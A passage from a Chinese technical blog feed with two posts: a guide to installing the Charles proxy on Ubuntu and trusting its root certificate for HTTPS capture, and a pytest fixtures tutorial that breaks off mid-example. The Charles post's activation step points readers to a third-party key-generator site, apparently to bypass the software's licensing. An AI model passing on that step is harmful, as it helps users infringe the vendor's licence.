    <content type="html"><![CDATA[<p>Ubuntu上使用Charles</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><ol><li>使用官网链接下载  <a href="https://www.charlesproxy.com/download/%E4%B8%8B%E8%BD%BD.tar.gz%E5%8C%85%E5%90%8E%E8%A7%A3%E5%8E%8B%EF%BC%8C%E8%BF%9B%E5%85%A5%E8%A7%A3%E5%8E%8B%E7%9B%AE%E5%BD%95/charles/bin">https://www.charlesproxy.com/download/下载.tar.gz包后解压，进入解压目录/charles/bin</a>  执行charles文件可打开charles</li><li>命令行方式下载安装</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget -q -O - https://www.charlesproxy.com/packages/apt/PublicKey | sudo apt-key add -<br>sudo sh -c ‘echo deb https://www.charlesproxy.com/packages/apt/ charles-proxy main &gt; /etc/apt/sources.list.d/charles.list’<br>sudo apt update<br>sudo apt-get install charles-proxy<br></code></pre></td></tr></table></figure><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><ol><li><p>激活地址<a href="https://www.zzzmode.com/mytools/charles/">https://www.zzzmode.com/mytools/charles/</a></p><p>填入RegisterName，点击“生成”按钮生成Name和Key</p></li></ol><p><img src="/img/charles/charles1.PNG" alt="img1"></p><ol start="2"><li>打开Charles &#x3D;&#x3D;&gt; Help &#x3D;&#x3D;&gt; Register Charles &#x3D;&gt; 输入</li></ol><p><img src="/img/charles/charles2.PNG" alt="img1"></p><h1 id="配置证书"><a href="#配置证书" class="headerlink" title="配置证书"></a>配置证书</h1><ol><li>可以尝试在charles上自动安装， Help – SSL Proxying – Install Charles Root Certificate</li></ol><p><img src="/img/charles/charles3.PNG" alt="img1"></p><p>我这里导入按钮无法点击，选择了另外一个方案</p><ol start="2"><li>.手动配置证书到系统</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/.charles/ca/<br><span class="hljs-built_in">cp</span> charles-proxy-ssl-proxying-certificate.pem charles-proxy-ssl-proxying-certificate.crt <span class="hljs-comment">#这种方式不一定能保证cp出来修改后缀的文件能被信息，最好用下面这种方式</span><br>openssl x509 -outform der -<span class="hljs-keyword">in</span> charles-proxy-ssl-proxying-certificate.pem -out charles-proxy-ssl-proxying-certificate.crt<br>sudo <span class="hljs-built_in">cp</span> charles-proxy-ssl-proxying-certificate.crt /usr/local/share/ca-certificates/<br>sudo update-ca-certificates<br></code></pre></td></tr></table></figure><p>执行完最后一个命令，命令行会有成功的提示</p><p>可以通过<code>cat /etc/ssl/certs/charles-proxy-ssl-proxying-certificate.pem</code> 看到证书已经被添加进去</p><p>&#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;下包含了系统自带的各种可信根证书</p><ol start="3"><li>浏览器上通过 设置——隐私和安全——管理设备证书——授权机构——导入 在&#x2F;usr&#x2F;local&#x2F;share&#x2F;ca-certificates&#x2F; 下的charles-proxy-ssl-proxying-certificate.crt 文件，然后选择信任该证书</li></ol><p><img src="/img/charles/charles4.PNG" alt="img1"></p><h1 id="修改charles的配置"><a href="#修改charles的配置" class="headerlink" title="修改charles的配置"></a>修改charles的配置</h1><p>在charles——Proxy——Proxy Setting——Proxies 修改内容如下：</p><p><img src="/img/charles/charles5.PNG" alt="img1"></p><h1 id="修改本机网络设置"><a href="#修改本机网络设置" class="headerlink" title="修改本机网络设置"></a>修改本机网络设置</h1><p><img src="/img/charles/charles6.PNG" alt="img1"></p><h1 id="开始抓包"><a href="#开始抓包" class="headerlink" title="开始抓包"></a>开始抓包</h1><p>在浏览器上发起请求可以看到charles上抓取的内容</p><p><img src="/img/charles/charles7.PNG" alt="img1"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之pytest如何使用fixture夹具-四【重】</title>
    <link href="/2024/01/23/664python%E4%B9%8Bpytest%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8fixture%E5%A4%B9%E5%85%B7-%E5%9B%9B/"/>
    <url>/2024/01/23/664python%E4%B9%8Bpytest%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8fixture%E5%A4%B9%E5%85%B7-%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="四、关于fixtures测试夹具的使用【重点】"><a href="#四、关于fixtures测试夹具的使用【重点】" class="headerlink" title="四、关于fixtures测试夹具的使用【重点】"></a>四、关于fixtures测试夹具的使用【重点】</h1><p><strong>这篇文章主要介绍<code>fixture</code>夹具，在项目中的使用技巧，代码比较多，文章比较长，请耐心看完</strong></p><blockquote><p>有些官方文档上的代码比价绕或者冗余，就自己写了简单版的便于理解</p></blockquote><h2 id="4-1-“Requesting”-fixtures（请求夹具）"><a href="#4-1-“Requesting”-fixtures（请求夹具）" class="headerlink" title="4.1 “Requesting” fixtures（请求夹具）"></a>4.1 “Requesting” fixtures（请求夹具）</h2><p>在基本层面上，测试函数通过将它们声明为参数来请求它们所需的装置。</p><p>当pytest运行测试时，它会查看该测试函数签名中的参数，然后搜索与这些参数名称相同的fixture。一旦pytest找到它们，它就运行这些fixture，捕获它们返回的内容(如果有的话)，并将这些对象作为参数传递给test函数。</p><h3 id="4-1-1-快速示例Quick-example"><a href="#4-1-1-快速示例Quick-example" class="headerlink" title="4.1.1 快速示例Quick example"></a>4.1.1 快速示例Quick example</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br>        self.cubed = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cube</span>(<span class="hljs-params">self</span>):<br>        self.cubed = <span class="hljs-literal">True</span> <span class="hljs-comment"># 当调用cube方法时，将cubed属性设置为True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FruitSalad</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *fruit_bowl</span>):<br>        self.fruit = fruit_bowl<br>        self._cube_fruit() <span class="hljs-comment"># 调用私有方法 调用了fruit的cube方法，使其为True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_cube_fruit</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> self.fruit:<br>            fruit.cube() <span class="hljs-comment"># 遍历调用fruit的cube方法</span><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fruit_bowl</span>(): <span class="hljs-comment"># 这是一个测试用例的fixture函数</span><br>    <span class="hljs-keyword">return</span> [Fruit(<span class="hljs-string">&quot;apple&quot;</span>), Fruit(<span class="hljs-string">&quot;banana&quot;</span>)] <span class="hljs-comment"># 返回了两个Fruit实例对象</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_fruit_salad</span>(<span class="hljs-params">fruit_bowl</span>): <span class="hljs-comment"># 传进来就可以用</span><br>    <span class="hljs-comment"># Act</span><br>    fruit_salad = FruitSalad(*fruit_bowl) <span class="hljs-comment"># 实例化FruitSalad 加*是可变参数</span><br><br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">all</span>(fruit.cubed <span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> fruit_salad.fruit) <span class="hljs-comment"># 调用了fruit的cubed方法 返回了Ture 断言成功</span><br></code></pre></td></tr></table></figure><p>如果要手动完成，需要这么做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">ef fruit_bowl(): <span class="hljs-comment"># 没有加fixture 装饰器，这是一个普通的函数</span><br>    <span class="hljs-keyword">return</span> [Fruit(<span class="hljs-string">&quot;apple&quot;</span>), Fruit(<span class="hljs-string">&quot;banana&quot;</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_fruit_salad</span>(<span class="hljs-params">fruit_bowl</span>):<br>    <span class="hljs-comment"># Act</span><br>    fruit_salad = FruitSalad(*fruit_bowl)<br><br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">all</span>(fruit.cubed <span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> fruit_salad.fruit)<br>    <br><span class="hljs-comment"># Arrange</span><br>bowl = fruit_bowl() <span class="hljs-comment"># 需要在这里手动去调用</span><br>test_fruit_salad(fruit_bowl=bowl) <span class="hljs-comment"># 需要手动去调用</span><br></code></pre></td></tr></table></figure><p>在这个例子中，test_fruit_salad“请求”了fruit_bowl(即def test_fruit_salad(fruit_bowl):)，当pytest看到这个时，它将执行fruit_bowl固定函数，并将它返回的对象作为fruit_bowl参数传递给test_fruit_salad。</p><blockquote><p>官方的这里示例描述的不太好，会把人看晕，看下面的就很简单明了，官方想表达的是，你如何定义一个fixture函数，然后如何使用它，你只需要在测试函数的入参里面加入即可，不需要手动执行你定义的fixture函数foo( )</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_foo</span>(<span class="hljs-params">foo</span>): <span class="hljs-comment"># 你可以不用去foo()这样调用foo 只需要传进来即可</span><br>    a = foo<br>    <span class="hljs-keyword">assert</span> a == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="4-1-2-Fixtures-也可以请求其他-fixtures【重点】"><a href="#4-1-2-Fixtures-也可以请求其他-fixtures【重点】" class="headerlink" title="4.1.2 Fixtures 也可以请求其他 fixtures【重点】"></a>4.1.2 Fixtures 也可以请求其他 fixtures【重点】</h3><p>pytest最大的优势之一是其极其灵活的夹具系统。它允许我们将复杂的测试需求简化为更简单和有组织的功能，我们只需要让每个功能描述它们所依赖的东西。我们将在后面深入讨论这个问题，但是现在，这里有一个快速的示例来演示fixture如何使用其他fixture:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_append.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>(): <span class="hljs-comment"># 第一个fixture 返回了 &quot;a&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>(<span class="hljs-params">first_entry</span>): <span class="hljs-comment"># order返回了一个列表，里面是first_entry的返回值 就是 [ &quot;a&quot; ]</span><br>    <span class="hljs-keyword">return</span> [first_entry]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string</span>(<span class="hljs-params">order</span>): <span class="hljs-comment"># 引入order 此时order = [ &quot;a&quot; ]</span><br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-string">&quot;b&quot;</span>) <span class="hljs-comment"># 给order 追加一个元素&quot;b&quot;</span><br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>]<br></code></pre></td></tr></table></figure><p>如果手动调用就是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>(): <span class="hljs-comment"># 没加fixture 就是一个普通函数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>(<span class="hljs-params">first_entry</span>): <span class="hljs-comment"># 没加fixture 就是一个普通函数</span><br>    <span class="hljs-keyword">return</span> [first_entry]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string</span>(<span class="hljs-params">order</span>):<br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-string">&quot;b&quot;</span>)<br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>]<br><br>entry = first_entry() <span class="hljs-comment"># 需要手动调用</span><br>the_list = order(first_entry=entry) <span class="hljs-comment"># 需要手动调用</span><br>test_string(order=the_list) <span class="hljs-comment"># 需要手动调用</span><br></code></pre></td></tr></table></figure><h3 id="4-1-3-Fixtures-可以重复使用【重点】"><a href="#4-1-3-Fixtures-可以重复使用【重点】" class="headerlink" title="4.1.3 Fixtures 可以重复使用【重点】"></a>4.1.3 Fixtures 可以重复使用【重点】</h3><p><code>pytest</code>的<code>fixture</code>系统如此强大的原因之一就是，它<strong>使我们能够定义一个可以重复使用的通用设置步骤</strong>，就像使用普通函数一样。两个不同的测试可以请求相同的fixture，并让<code>pytest</code>从该<code>fixture</code>为每个测试提供各自的结果。</p><p><strong>这对于确保测试用例不会相互影响非常有用。我们可以使用这个系统来确保每个测试都获得自己的一批新鲜数据，并且从干净的状态开始，这样它就可以提供一致、可重复的结果。</strong></p><p>使用的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_append.py</span><br><span class="hljs-keyword">import</span> pytest<br><span class="hljs-comment"># 这里和之前的代码一样</span><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>(<span class="hljs-params">first_entry</span>):<br>    <span class="hljs-keyword">return</span> [first_entry]<br><span class="hljs-comment"># 重点在这下面两个测试用例里</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string</span>(<span class="hljs-params">order</span>):<br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-string">&quot;b&quot;</span>) <span class="hljs-comment"># order追加了 &quot;b&quot; 但是用例结束后没有改变order，其他用例仍然用order的初始值时使用，order仍然是 [ &quot;a&quot; ]</span><br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_int</span>(<span class="hljs-params">order</span>): <span class="hljs-comment"># 他用例仍然用order的初始值时使用，order仍然是 [ &quot;a&quot; ]</span><br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-number">2</span>) <span class="hljs-comment"># order 追加了一个 &quot;2&quot;</span><br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>这里的每个测试用例都被赋予了该列表对象的自己的副本，这意味着<code>fixture</code>装置函数被执行两次（对于<code>first_entry</code>固定装置也是如此）。</p><p>如果我们也手动执行此操作，就是这样写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>(<span class="hljs-params">first_entry</span>):<br>    <span class="hljs-keyword">return</span> [first_entry]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string</span>(<span class="hljs-params">order</span>):<br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-string">&quot;b&quot;</span>)<br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_int</span>(<span class="hljs-params">order</span>):<br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">2</span>]<br><br>entry = first_entry() <span class="hljs-comment"># </span><br>the_list = order(first_entry=entry)<br>test_string(order=the_list)<br><br><span class="hljs-comment"># 重点在这里，这里再次entry = first_entry() 是因为前面的entry已经被改变了，变成了[&quot;a&quot;, &quot;b&quot;]，不能使用了，需要一个新的entry = first_entry()也就是[ &quot;a&quot; ]</span><br>entry = first_entry() <br>the_list = order(first_entry=entry)<br>test_int(order=the_list)<br></code></pre></td></tr></table></figure><h3 id="4-1-4-一个-test或者fixture可以同时请求多个fixture【重点】"><a href="#4-1-4-一个-test或者fixture可以同时请求多个fixture【重点】" class="headerlink" title="4.1.4 一个 test或者fixture可以同时请求多个fixture【重点】"></a>4.1.4 一个 test或者fixture可以同时请求多个fixture【重点】</h3><p>测试用例和fixture装置不限于一次请求一个fixture装置。他们可以要求任意数量的。</p><p>这是另一个演示的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_append.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>(): <span class="hljs-comment"># first_entry() = &quot;a&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">second_entry</span>(): <span class="hljs-comment">#  second_entry()= 2</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>(<span class="hljs-params">first_entry, second_entry</span>):  <br>    <span class="hljs-comment"># 重点在这个fixture装置里，这里不仅可以使用其他fixture 还可以使用多个其他fixture</span><br>    <span class="hljs-keyword">return</span> [first_entry, second_entry] <span class="hljs-comment"># # 所以order() = [&quot;a&quot;, 2]</span><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">expected_list</span>(): <span class="hljs-comment">#  second_entry()= [&quot;a&quot;, 2, 3.0]</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3.0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string</span>(<span class="hljs-params">order, expected_list</span>):<br>    <span class="hljs-comment"># Act</span><br>    order.append(<span class="hljs-number">3.0</span>)<br><br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-keyword">assert</span> order == expected_list <span class="hljs-comment">#order本来是[&quot;a&quot;, 2]追加了一个3.0 所以断言肯定成功</span><br></code></pre></td></tr></table></figure><blockquote><p>这里讲的几个还是比较重要的</p><p>1、如何使用fixture</p></blockquote><h3 id="4-1-5-每次测试可以多次请求fixture夹具（返回值被缓存）"><a href="#4-1-5-每次测试可以多次请求fixture夹具（返回值被缓存）" class="headerlink" title="4.1.5 每次测试可以多次请求fixture夹具（返回值被缓存）"></a>4.1.5 每次测试可以多次请求fixture夹具（返回值被缓存）</h3><p>在同一测试用例期间也可以多次请求fixture夹具函数,、</p><p>并且 pytest 不会在该测试中再次执行它们,</p><p>意味着我们可以在依赖于它们的多个fixture装置中请求其他fixture装置（甚至在测试本身中再次请求fixture装置），而无需多次执行这些fixture装置。—-看着有点绕先不管，接着往下看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_append.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;如果运行了<span class="hljs-subst">&#123;first_entry.__name__&#125;</span>就会打印这句话&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-comment"># Arrange</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;如果运行了<span class="hljs-subst">&#123;order.__name__&#125;</span>就会打印这句话&quot;</span>)<br>    <span class="hljs-keyword">return</span> []<br><span class="hljs-comment"># Act</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">append_first</span>(<span class="hljs-params">order, first_entry</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;如果运行了<span class="hljs-subst">&#123;append_first.__name__&#125;</span>就会打印这句话&quot;</span>)<br>    <span class="hljs-keyword">return</span> order.append(first_entry)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string_only</span>(<span class="hljs-params">append_first, order, first_entry</span>):<br>    <span class="hljs-comment"># Assert</span><br>    <span class="hljs-built_in">print</span>(order) <span class="hljs-comment"># 这个时候order已经被改变了，已经是[&quot;a&quot;]了而不是[]</span><br>    <span class="hljs-built_in">print</span>(first_entry) <span class="hljs-comment"># a </span><br>    <span class="hljs-keyword">assert</span> order == [first_entry]<br><span class="hljs-comment"># 所以当fixture在fixture和test_之间混合使用时是会有缓存的，最后汇总到一起</span><br></code></pre></td></tr></table></figure><p>如果在测试期间每次请求时都执行一次所定义的fixture装置的话 ，那么这个测试就会失败,、</p><p>因为<code>append_first</code>方法和<code>test_string_only</code>用例都会将<code>order</code>视为一个空列表(如[ ]),</p><p>但由于 <code>order</code> 的返回值在第一次调用后被缓存（以及执行它可能产生的任何副作用），测试用例判断了<code>append_first</code>对该对象的影响。</p><blockquote><p>这里官方想表达的是，fixture在fixture和test_之间混合使用不会重复执行，看一下终端输出结果会更清晰</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">================================================================================ test session starts ================================================================================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span><br><br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collected <span class="hljs-number">1</span> item                                                                                                                                                                    <br><br>testcases/test_fixturestest.py <br>如果运行了order就会打印这句话<br>如果运行了first_entry就会打印这句话<br>如果运行了append_first就会打印这句话<br>[<span class="hljs-string">&#x27;a&#x27;</span>]<br>a<br>.<br><br>================================================================================= <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s =================================================================================<br></code></pre></td></tr></table></figure><p><strong>这里的每段print( xxx )，都只被打印了一次，如果会重复执行的话，就会打印多次了。</strong></p><h2 id="4-2-自动使用fixtue（不必主动请求的fixture）"><a href="#4-2-自动使用fixtue（不必主动请求的fixture）" class="headerlink" title="4.2 自动使用fixtue（不必主动请求的fixture）"></a>4.2 自动使用fixtue（不必主动请求的fixture）</h2><p>测试中有时可能想要有一个（甚至几个）让所有测试用例都依赖的<code>fixture</code>装置，</p><p>自动使用<code>fixture</code>装置是一种让所有测试用例都自动请求它们的便捷方法。这可以消除大量冗余的请求，甚至可以提供更高级的夹具使用（更多内容请参见下文）</p><p>可以通过将 <code>autouse=True</code> 传递给装饰器<code>pytest.fixture</code>来使<code>fixture</code>成为自动使用的<code>fixture</code>。</p><p>代码简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 